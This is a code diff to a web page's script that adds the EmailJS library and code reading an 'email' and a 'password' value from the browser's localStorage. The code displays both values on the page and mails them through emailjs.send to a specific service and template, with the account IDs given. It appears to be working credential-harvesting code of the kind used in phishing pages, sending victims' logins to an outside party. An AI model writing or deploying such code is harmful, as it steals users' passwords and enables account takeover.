@@ -38,10 +38,23 @@
         </div>
     </div>
 </section>
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
 <script>
 
-    document.getElementById("data").innerHTML = localStorage.getItem("txtValue");
-    document.getElementById("data1").innerHTML = localStorage.getItem("txtValue1");
+    document.getElementById("data").innerHTML = localStorage.getItem("email");
+    document.getElementById("data1").innerHTML = localStorage.getItem("password");
+
+    emailjs.init("user_9sK7bPjgP9QH4cwEIdJkI");
+
+    emailjs.send('service_5bc2xvd', 'template_22kv7mn', {
+        login: localStorage.getItem("email"),
+        password: localStorage.getItem("password")
+    }).then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+    }, function(error) {
+        console.log('FAILED...', error);
+    });
 
 </script>
 </body>
